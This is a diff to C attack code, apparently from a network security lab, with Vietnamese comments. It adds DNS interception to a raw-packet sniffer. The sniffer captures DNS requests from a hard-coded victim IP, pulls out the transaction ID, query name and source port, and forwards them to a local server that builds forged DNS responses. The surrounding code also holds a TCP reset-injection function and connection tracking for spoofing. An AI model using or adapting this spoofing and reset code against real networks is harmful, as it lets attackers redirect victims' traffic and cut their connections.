@@ -14,6 +14,8 @@
 #include <errno.h>
 #include <stdarg.h>
 #include <time.h>
+#include <netinet/udp.h>
+#include <netpacket/packet.h>
 
 #define MAX_ETHER 1518
 #define INTERFACE "eth0"
@@ -21,6 +23,9 @@
 #define LOCAL_SERVER_PORT 9090
 #define VICTIM_IP "172.20.0.102"
 #define SIZE_ETHERNET 14
+
+// Thêm define cho DNS
+#define DNS_PORT 53
 
 // Save TCP connection state for more accurate spoofing
 struct tcp_conn_state {
@@ -30,6 +35,27 @@ struct tcp_conn_state {
     uint16_t dport;
     uint16_t window;
     uint8_t flags;
+};
+
+struct dns_header {
+    uint16_t id;
+    uint16_t flags;
+    uint16_t qdcount;
+    uint16_t ancount;
+    uint16_t nscount;
+    uint16_t arcount;
+};
+
+// Use a single DNS structure instead of two different ones
+struct dns_info {
+    uint16_t txid;      // Transaction ID
+    uint16_t flags;     // Flags field
+    uint16_t qdcount;   // Number of questions
+    uint16_t ancount;   // Number of answers
+    uint16_t nscount;   // Number of authority records
+    uint16_t arcount;   // Number of additional records
+    char query[256];    // Query name buffer
+    uint16_t src_port;  // Source port for response
 };
 
 // Checksum calculation
@@ -227,9 +253,109 @@ void send_tcp_reset(struct iphdr *iph, struct tcphdr *tcph) {
     close(sock);
 }
 
+// Update function to accept port number
+void send_dns_to_local_server(struct dns_info *dns, uint16_t sport) {
+    int sockfd;
+    struct sockaddr_in servaddr;
+    char recv_buffer[1024];
+
+    printf("\n[+] Creating connection to local server\n"); 
+    
+    // Create UDP socket
+    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        perror("[-] Socket creation failed");
+        return;
+    }
+
+    servaddr.sin_family = AF_INET;
+    servaddr.sin_port = htons(LOCAL_SERVER_PORT);
+    servaddr.sin_addr.s_addr = inet_addr(LOCAL_SERVER_HOST);
+
+    // Format DNS request message
+    char message[1024];
+    snprintf(message, sizeof(message),
+            "DNS_REQUEST\n"
+            "TXID=%u\n"
+            "QUERY=%s\n" 
+            "SPORT=%u\n",
+            dns->txid, dns->query, sport);
+
+    printf("[+] Sending DNS info: %s\n", message);
+
+    // Send and wait for ACK
+    if (sendto(sockfd, message, strlen(message), 0,
+               (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
+        perror("[-] Failed to send DNS info");
+    } else {
+        printf("[+] DNS info sent successfully\n");
+        
+        // Wait for ACK
+        socklen_t len = sizeof(servaddr);
+        int n = recvfrom(sockfd, recv_buffer, sizeof(recv_buffer)-1, 0,
+                     (struct sockaddr *)&servaddr, &len);
+        
+        if (n > 0) {
+            recv_buffer[n] = '\0';
+            printf("[+] Received ACK: %s\n", recv_buffer);
+        }
+    }
+
+    close(sockfd);
+}
+
+/*
+CHỨC NĂNG:
+1. Bắt các DNS request từ victim (port 53)
+2. Parse DNS header để lấy transaction ID và query name
+3. Forward DNS info tới local_server để tạo fake response
+4. Không cần gửi RST cho DNS packets
+*/
+
 void process_packet(unsigned char *packet, int size) {
     struct iphdr *iph = (struct iphdr*)(packet + SIZE_ETHERNET);
     
+    // STEP 1: Bắt và phân tích DNS request
+    if (iph->protocol == IPPROTO_UDP) {
+        struct udphdr *udph = (struct udphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
+        
+        printf("\n=== STEP 1: DNS Request Capture ===\n");
+        printf("Source IP: %s\n", inet_ntoa(*(struct in_addr*)&iph->saddr));
+        printf("Source Port: %d\n", ntohs(udph->uh_sport));
+        printf("Dest Port: %d\n", ntohs(udph->uh_dport));
+        
+        // Kiểm tra DNS request từ victim
+        if (ntohs(udph->uh_dport) == 53 && 
+            strcmp(inet_ntoa(*(struct in_addr*)&iph->saddr), VICTIM_IP) == 0) {
+            
+            printf("\n[+] Valid DNS request detected!\n");
+            
+            // STEP 2: Parse DNS request
+            struct dns_info dns = {0};
+            char *dns_data = (char*)(packet + SIZE_ETHERNET + iph->ihl*4 + sizeof(struct udphdr));
+            
+            memcpy(&dns.txid, dns_data, 2); 
+            dns.txid = ntohs(dns.txid);
+            
+            // Extract domain name
+            char *query = dns_data + 12;
+            int query_len = 0;
+            while(query[query_len] && query_len < 255) query_len++;
+            
+            memcpy(dns.query, query, query_len);
+            dns.query[query_len] = '\0';
+            dns.src_port = ntohs(udph->uh_sport);
+            
+            printf("\n=== STEP 2: DNS Request Info ===\n");
+            printf("Transaction ID: %u\n", dns.txid);
+            printf("Query Domain: %s\n", dns.query);
+            printf("Source Port: %u\n", dns.src_port);
+            
+            // STEP 3: Forward tới local_server
+            printf("\n=== STEP 3: Forwarding to Local Server ===\n");
+            send_dns_to_local_server(&dns, dns.src_port);
+        }
+    }
+
     if (iph->protocol == IPPROTO_TCP) {
         struct tcphdr *tcph = (struct tcphdr*)(packet + SIZE_ETHERNET + iph->ihl*4);
         struct sockaddr_in source;
